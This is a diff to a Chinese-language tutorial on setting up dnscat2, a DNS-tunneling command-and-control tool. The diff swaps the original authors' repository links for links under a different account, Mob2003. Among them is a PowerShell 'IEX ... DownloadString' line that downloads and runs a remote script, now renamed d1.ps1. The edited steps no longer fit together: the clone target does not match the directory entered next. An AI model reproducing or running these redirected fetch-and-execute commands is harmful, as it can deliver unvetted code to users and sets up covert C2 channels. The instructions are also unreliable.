@@ -14,14 +14,14 @@ dnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制�
 项目地址
 
 ```shell
-https://github.com/iagox86/dnscat2
+https://github.com/Mob2003/dnscat2-powershell
 ```
 
 ubuntu 20.04安装说明
 
 ```shell
 apt install ruby-dev
-git clone https://github.com/iagox86/dnscat2.git
+git clone https://github.com/Mob2003/dnscat2-powershell.git
 cd dnscat2/server/
 gem install bundler
 bundle install
@@ -38,13 +38,13 @@ ruby ./dnscat2.rb --no-cache --secret=12345678 www.baidu.com
 项目地址
 
 ```shell
-https://github.com/lukebaggett/dnscat2-powershell
+https://github.com/Mob2003/dnscat2-powershell
 ```
 
 打开powershell
 
 ```shell
-IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Mob2003/dnscat2-powershell/master/d1.ps1')
 ```
 
 连接服务器
